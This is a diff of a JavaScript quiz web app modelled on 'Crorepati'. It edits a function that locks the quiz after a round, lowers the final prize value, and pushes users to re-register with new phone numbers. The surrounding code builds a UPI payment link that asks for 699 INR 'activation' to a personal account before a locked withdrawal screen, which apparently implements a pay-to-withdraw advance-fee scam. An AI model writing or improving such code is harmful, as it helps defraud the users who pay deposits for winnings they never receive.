@@ -316,7 +316,8 @@
       500,  500,  750,  750,  1000, 
       1000, 1000, 1250, 1250, 1250, 
       1250, 1500, 1500, 1500, 1500, 
-      1750, 1750, 2000, 2000, 2000
+      1750, 1750, 2000, 2000, 1000
+
     ];
 
     var qList = [
@@ -780,12 +781,24 @@
       showBreakdown();
     }
 
-    function showLockedWithdrawal() {
+        function showLockedWithdrawal() {
       isQuizLocked = true;
+
       var btn = document.getElementById('btnPlayLobby');
       if (btn) {
         btn.innerText = "Round Completed (Locked)";
-        btn.style.opacity = "0.7";
+        btn.onclick = function() {
+          alert("Aapka quiz round complete ho chuka hai! Naya round khelne ke liye Profile me Logout karke naye number se login karein.");
+        };
+        btn.style.opacity = "0.6";
+      }
+
+      var playTab = document.getElementById('tabPlay');
+      if (playTab) {
+        playTab.onclick = function() {
+          alert("Quiz locked! Naye session ke liye profile me jakar logout karein.");
+          showScreen('screenProfile');
+        };
       }
 
       var upi = "upi://pay?ver=01&pa=Jkha2525@mvhdfc&pn=JUBER&mc=0000&cu=INR&am=699&mode=01&purpose=00&qrmedium=02&tn=Crorepati_Activation";
@@ -795,6 +808,7 @@
       document.getElementById('depositSuccessBox').style.display = 'none';
       showScreen('screenLocked');
     }
+
 
     function verifyDepositAction() {
       var utr = document.getElementById('utrInput').value.trim();
